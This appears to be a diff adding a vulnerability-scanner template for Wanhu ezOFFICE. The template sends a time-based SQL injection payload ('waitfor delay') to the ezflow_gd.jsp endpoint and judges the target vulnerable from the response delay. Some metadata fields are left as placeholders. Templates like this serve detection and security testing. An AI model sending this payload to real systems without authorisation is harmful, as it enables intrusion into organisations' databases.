@@ -1,0 +1,28 @@
+id: wanhu-ezoffice-ezflow_gd-sqli
+info:
+  name: wanhu ezoffice ezflow_gd.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-wanOA-ezOFFICE-gd_startUserCode-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+  tags: wanhu,ezoffice,sqli,time
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 404
+          - duration >= 5 && duration < 9
+        condition: and
